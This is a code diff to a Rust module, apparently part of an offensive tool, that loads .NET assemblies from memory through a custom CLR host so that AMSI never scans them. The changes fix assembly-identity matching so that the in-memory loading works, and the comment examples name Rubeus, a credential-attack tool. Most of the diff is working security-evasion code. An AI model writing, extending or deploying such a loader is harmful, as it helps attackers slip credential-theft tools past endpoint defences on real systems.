@@ -11,7 +11,7 @@
 //! 4. When Load_2("identity") is called, CLR calls our ProvideAssembly
 //! 5. We return an IStream with the assembly bytes - AMSI never scans it!
 
-use crate::primitives::{Interface, IUnknownVtbl, GUID, HRESULT};
+use crate::primitives::{IUnknownVtbl, Interface, GUID, HRESULT};
 use std::collections::HashMap;
 use std::ffi::c_void;
 use std::ptr;
@@ -123,6 +123,21 @@ impl AssemblyStorage {
     pub fn get(&self, identity: &str) -> Option<&Vec<u8>> {
         self.assemblies.get(identity)
     }
+
+    /// Find an assembly by simple name (case-insensitive, ignores version/culture/etc.)
+    /// This is needed because the CLR normalizes identity strings before passing them
+    /// to ProvideAssembly, potentially adding fields like `processorArchitecture=MSIL`.
+    pub fn find_by_simple_name(&self, simple_name: &str) -> Option<&Vec<u8>> {
+        let needle = simple_name.trim().to_lowercase();
+        self.assemblies.iter().find_map(|(key, val)| {
+            let stored_simple = key.split(',').next().unwrap_or(key).trim().to_lowercase();
+            if stored_simple == needle {
+                Some(val)
+            } else {
+                None
+            }
+        })
+    }
 }
 
 impl Default for AssemblyStorage {
@@ -191,8 +206,7 @@ pub struct MemoryStreamVtbl {
         pstatstg: *mut c_void,
         grfStatFlag: u32,
     ) -> HRESULT,
-    pub Clone:
-        unsafe extern "system" fn(this: *mut c_void, ppstm: *mut *mut c_void) -> HRESULT,
+    pub Clone: unsafe extern "system" fn(this: *mut c_void, ppstm: *mut *mut c_void) -> HRESULT,
 }
 
 /// In-memory IStream implementation
@@ -373,7 +387,10 @@ unsafe extern "system" fn memory_stream_copy_to(
     HRESULT(0x80004001u32 as i32) // E_NOTIMPL
 }
 
-unsafe extern "system" fn memory_stream_commit(_this: *mut c_void, _grfCommitFlags: u32) -> HRESULT {
+unsafe extern "system" fn memory_stream_commit(
+    _this: *mut c_void,
+    _grfCommitFlags: u32,
+) -> HRESULT {
     HRESULT(0) // S_OK - nothing to commit
 }
 
@@ -805,29 +822,52 @@ unsafe extern "system" fn host_assembly_store_provide_assembly(
         ))
     };
 
-    // Look up in our storage
+    // Look up in our storage.
+    //
+    // IMPORTANT: The CLR normalizes the identity string before passing it to
+    // ProvideAssembly. For example, we register with:
+    //   "Rubeus, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null"
+    // but the CLR calls us with something like:
+    //   "Rubeus, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null, processorArchitecture=MSIL"
+    // A strict key lookup will always miss → CLR falls back to disk → ERROR_BAD_FORMAT (0x8007000B).
+    //
+    // Strategy: extract the assembly simple name (everything before the first ',')
+    // from the CLR-provided identity, then find a registered assembly whose simple
+    // name matches. This is robust against any extra fields the CLR appends.
     let storage = match store.storage.lock() {
         Ok(s) => s,
         Err(_) => return HRESULT(0x8007000Eu32 as i32), // E_OUTOFMEMORY
     };
 
-    match storage.get(&identity) {
+    // Extract simple name from the CLR-provided identity.
+    // The CLR normalizes identity strings before calling ProvideAssembly, potentially
+    // appending extra fields like `processorArchitecture=MSIL`. We use the simple name
+    // (everything before the first comma) for a robust fallback match.
+    let clr_simple_name = identity.split(',').next().unwrap_or(&identity).trim();
+
+    // Try exact match first (fast path), then fall back to simple-name match.
+    let found_bytes = storage
+        .get(&identity)
+        .or_else(|| storage.find_by_simple_name(clr_simple_name));
+
+    match found_bytes {
         Some(bytes) => {
             // Found! Create an IStream with the bytes
             let stream = MemoryStream::new(bytes.clone());
             *ppStmAssemblyImage = stream.into_raw();
 
-            // Set assembly ID (just use a simple counter or hash)
+            // Set a stable assembly ID (use the length of the CLR-provided identity as a
+            // simple unique-enough value; a real implementation would use a counter)
             if !pAssemblyId.is_null() {
-                *pAssemblyId = identity.len() as u64; // Simple ID
+                *pAssemblyId = identity.len() as u64;
             }
 
             HRESULT(0) // S_OK
-        }
+        },
         None => {
             // Not found - return "file not found" so CLR uses normal resolution
-            HRESULT(0x80070002u32 as i32) // COR_E_FILENOTFOUND / HRESULT_FROM_WIN32(ERROR_FILE_NOT_FOUND)
-        }
+            HRESULT(0x80070002u32 as i32) // COR_E_FILENOTFOUND
+        },
     }
 }
 
@@ -864,10 +904,7 @@ impl AmsiBypassLoader {
     /// Register an assembly to be loaded by identity
     /// When Load_2(identity) is called, our ProvideAssembly returns these bytes
     pub fn register_assembly(&self, identity: &str, bytes: Vec<u8>) -> Result<(), String> {
-        let mut storage = self
-            .storage
-            .lock()
-            .map_err(|_| "Failed to lock storage")?;
+        let mut storage = self.storage.lock().map_err(|_| "Failed to lock storage")?;
         storage.register(identity, bytes);
         Ok(())
     }
@@ -897,4 +934,3 @@ impl Drop for AmsiBypassLoader {
         }
     }
 }
-
